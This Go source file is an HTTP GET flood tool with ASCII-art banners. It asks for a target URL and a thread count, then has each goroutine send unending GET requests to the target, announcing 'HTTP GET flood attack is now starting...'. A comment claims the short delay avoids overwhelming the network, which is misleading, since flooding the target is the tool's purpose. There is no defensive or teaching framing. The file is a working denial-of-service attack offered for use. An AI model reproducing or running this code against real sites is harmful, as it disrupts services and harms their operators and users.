package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)
const evil =`
KMMd .MMM: cMMX OMMMMMMMM, kMMx       ;0MMMMXl    :KMMMMNx.  oMMMM:  OMMMM  NMMMMMMMM.
                      oMMX lMMMk kMMo OMMN00000. kMMx      oMMMOxNMMO  xMMWOxXMMW. oMMMM0 .MMMMM  WMMX00000
                      .MMM.0MMMW WMM. OMMk.....  kMMx      MMM:  .MMM..MMM'   0MMk oMMNMM.lMNMMM  WMMd....
                       XMMdMMoMMdMMX  OMMMMMMMl  kMMx     'MMM.       :MMM    oMMX oMMkMMoKMkMMM  WMMMMMMM,
                       lMMMMW NMMMMo  OMM0cccc.  kMMx     .MMM'   dxx.,MMM.   xMM0 oMMoKMWMW;MMM  WMMkcccc.
                       .MMMMk xMMMM.  OMM0ccccc. kMMKooooo 0MMX;,xMMN  XMMK;,oMMM; oMMo:MMMx,MMM  WMMkccccc
                        KMMM; ;MMMX   OMMMMMMMM: kMMMMMMMM  OMMMMMMX.  .OMMMMMMN:  oMMo WMM',MMM  WMMMMMMMM.
                        .;;;   ;;;.   .;;;;;;;;. .;;;;;;;;   .;cc:.      .;cc:'    .;;. ';,  ;;;  ,;;;;;;;;
                                                        .,
         .kWMNo lNK  :N0 ,KMMK,     dNNNKo              0M,    dNk  oNc        'N,  oNMWk                .N:
         OMKlNM;.MM. OMl.MM0OMW.    xMN0WMk  .::.  .' : 0M, ', xMMd dMl  .:;  .kMo.cMWl0Mk  .:;.  ,. ;,  dMx..,.;..,. .,.
         KMXc:'. KMl WM.oMK  0W:    xMx ,MM.dMWWMd OMNM.0M,dMO xMMMldMl kMNWW'lMMMooMWo:,. oMWWM; MNWMMc;MMMx:MNMocMx kM'
         ;WMMMN. cM0;M0 kMk         xMx .MM.,c,cMX OMK: 0M0M0  xMWMMNMl'MX'oMO OM: .XMMMWc MW,:MX MM,lMk xMl :MWc. WN NX
         ,::oNMk  MMKM: dM0  o0;    xMx 'MM.lMN0MX OM;  0MMMX  xMlOMMMl;MNOOOd kM; .;:lKMW.MWOOOk MM ;MO dMc :Mk   xMlMl
         XMkcXMd  OMMW  'MMxdMM..WN xMXxNM0 WM'cMN.OM;  0Mk0Mo xMc KMMl.MN.:Nk kMo dMKcOMX WW.,NK MM ;MO dMx.:Mx   .MWM.
         'XMMM0   ;MMk   cNMMWc .MW xMMMWx  OMM0NMoOM;  0M,.WM.xMc .XMl cWMMN' cMMo OMMMX' ,NMMN; MM ;MO ;MMx:Mx    KM0
            .              ..                ..  .                        ..     .    ..     ..            .       .KM;
                                                                        .ooo.                                     ;MMd
                        XMMMMM   ;MMMMM:                                'MMMc                                      .
                        XMMMMMc  kMMMMM:                                'MMMc
                        XMMMMM0  WMMMMM:   :ONWWXx'   kKK.cKWNO.'kNWK;  'MMMxkNWKo    .dKWWN0l   ,KKx;KWx
                        XMMXMMM.:MMXMMM:  KMMMKXMMMc  XMMWMMMMMWMMMMMM' 'MMMMMMMMMO  ;MMMN0WMMX. ;MMWMMMO
                        XMM0XMMlOMWxMMM: lMMM.  dMMM. XMMW' OMMMo cMMMl 'MMMK. kMMM. WMMO  .WMMd ;MMMWdl,
                        XMMKlMMNMMkdMMM: OMMMMMMMMMM, XMMK  oMMM. .MMMo 'MMMc  ,MMM;.MMMMMMMMMMK ;MMMl
                        XMMX.MMMMM,xMMM: kMMW''';lll. XMMK  oMMM. .MMMo 'MMMl  ;MMM,.MMMx'''cll: ;MMM;
                        XMMX OMMMN xMMM: ;MMMo..kMMM. XMMK  oMMM. .MMMo 'MMMWlcXMMW  KMMX'.,WMMk ;MMM;
                        XMMX ;MMMo xMMM:  cWMMMMMMWc  XMMK  oMMM. .MMMo 'MMM0MMMMMc  .0MMMMMMMK. ;MMM;
                        :cc:  ccc. 'ccc.    ;oddo;    ;cc;  .ccc   ccc.  cc; ,odl.     .cdddc'   .ccc.
               ;;,.  ,;;.   .::.   ,c,     ;.    .;'  .;  .;  .::.    .;;  ;;   ;,  .;.    .;.  .;  ,;  .;'   ':;
              'MMMMc NMMMO 'WWWMl 0MKMk   ,Ml    xMW  oMk xM :MWWM:   cMM'cMM. cMM. :M:    OMN  xM.dMx  kMW  lMXWX
              'Mo XW NK xM'OM. KW MN:c;   ,Ml    WKM: oMMoxM NN  xo   cMWokWM. KKMd :M:   .MKM, xMoMO   WKM; OMl::
              'Mo OM NK :M:XW  kM.lWMMk   ,Ml   :M'W0 oMNMNM M0.XXk   cMKKN0M..Mc0N :M:   cM.Wk xMMMk  :M'WO 'NMMX
              'Md.NN NX.kM'OM. XW.xc.NM   ,Md.. 0MKWM.oM.NMM NN.;WK   cMdMWdM.dMXNM,:Ml.. KM0WW xMkOM, 0MKWM.od.OM;
              'MMMW: NMMMx .NMMMc 0MWMO   ,MMMMlM0cxMloM 'WM :MMMNK   cM,MkdM'NXcoMk:MMMMlMOckM:xM..MX.M0cxMclMWMN`
func getFlood(targetURL string, numThreads int) {
	var wg sync.WaitGroup
	client := http.Client{
		Timeout: time.Duration(30 * time.Second), // Extended timeout duration
	}

	for i := 0; i < numThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				_, _ = client.Get(targetURL)
				// Add a very short delay between each request to avoid overwhelming the network
				time.Sleep(10 * time.Millisecond)
			}
		}()
	}
	wg.Wait()
}

func main() {
	reader := bufio.NewReader(os.Stdin)
fmt.Print(evil)
	fmt.Print("Enter the target URL: ")
	targetURL, _ := reader.ReadString('\n')

	fmt.Print("Enter the number of threads: ")
	numThreadsInput, _ := reader.ReadString('\n')
	numThreads, err := strconv.Atoi(strings.TrimSpace(numThreadsInput))
	if err != nil {
		fmt.Println("Error: Please enter a valid number for threads.")
		return
	}

	targetURL = strings.TrimSpace(targetURL) // Remove leading/trailing whitespaces
	fmt.Println("HTTP GET flood attack is now starting...")
	const get=`:lllllc;  :lllllll:.lllllllll     .llllllll.cl         :llllll;   :llllll;  :llllllc;
                 KM0OOOOXMo XM0OOOOOx.OOOXMXOOO.    lMNOOOOOO.WM        xMKOOOOKMk OM0OOOOKMd XM0OOOOXMo
                 XM.   ..;. XM:''''.     oMl        lMk'''''  WM        OM,    ,M0 KM.    :Mx XM.    cMx
                 XM.  oMMMd XMWWWWWo     oMl        lMWWWWWX  WM        OM,    ,M0 KM.    :Mx XM.    cMx
                 XM.  ..oMd XM.          oMl        lMd       WM.       OM;    ;M0 KM'    cMx XM'    lMx
                 dMMMMMMMW; XMMMMMMMX    oMl        lMd       WMMMMMMMMlcMMMMMMMMc oMMMMMMMW: XMMMMMMMW;
                   ......   .........     .          .        .........   ......     ......   ........

                              oxxxxxxd. xxxxxxxxx,xxxxxxxxx. oxxxxxxd.  oxxxxxxxo cx.   .xx.
                             dMOooookMK oooOMXooo'oooOMXooo.oM0ooooxMX dM0ooooooc OM,  :WW:
                             xMc    'MX    :Mx       ;Mk    dMl    .MN dM:        OMxckMK.
                             xMMMMMMMMX    :Mx       ;Mk    dMMMMMMMMN dM:        OMX0NMo
                             xMl....;MX    :Mx       ;Mk    dMo....,MN dMd....... OM,  OM0.
                             dW:    .WK    :Wx       ;Wx    dWc    .WX 'XWWWWWWWK kW,   :WN.


                        'OKKKKKKk.,KKKKKKKKK ,0KKKKKKk. OKKKKKKKk.:KKKKKKKKK 0KKKKKKKx OKKKKKKKk.
                        KMo::::dXo.:::KMx::: XMl::::kMd XMl::::kMo.:::XMo::; WMc:::::, XMl::::kMx
                        0MOxxxxxl     kM:    XM:....dMx XM:''''xMd    0M'    WMxxxxx,  XM.    cMx
                        .lddddd0Mx    kM:    XMMMMMMMMx XMWWWMMWK.    0M'    WMxdddd'  XM.    cMx
                        OXl::::xMx    kM:    XM.    cMx XM.  :WW;     0M'    WMc:::::, XMo::::kMx
                        'OKKKKK0k.    oK,    kK.    ;Kl kK.   .OK;    xK.    0KKKKKKKd kKKKKKK0k.`
	fmt.Print(get)
	getFlood(targetURL, numThreads)
}
